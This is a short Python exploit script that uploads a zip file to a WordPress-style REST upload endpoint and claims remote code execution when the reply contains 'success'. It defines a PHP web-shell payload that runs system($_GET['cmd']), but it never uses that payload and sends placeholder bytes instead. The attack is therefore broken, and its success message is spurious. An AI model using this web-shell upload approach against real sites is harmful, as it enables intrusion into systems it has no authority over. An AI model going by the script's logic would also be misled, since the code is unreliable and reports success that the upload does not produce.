import requests

def run_exploit(target_url):
    payload = "<?php echo 'SPAWNED'; system($_GET['cmd']); ?>"
    plugin_zip = {
        "plugin": ("malicious.zip", b"FAKE_ZIP_BYTES", "application/zip")
    }

    try:
        r = requests.post(target_url + "/wp-json/spam/v1/upload", files=plugin_zip)
        if "success" in r.text:
            print("[+] Plugin RCE triggered via fake spam upload endpoint.")
            return True
    except:
        pass
    return False
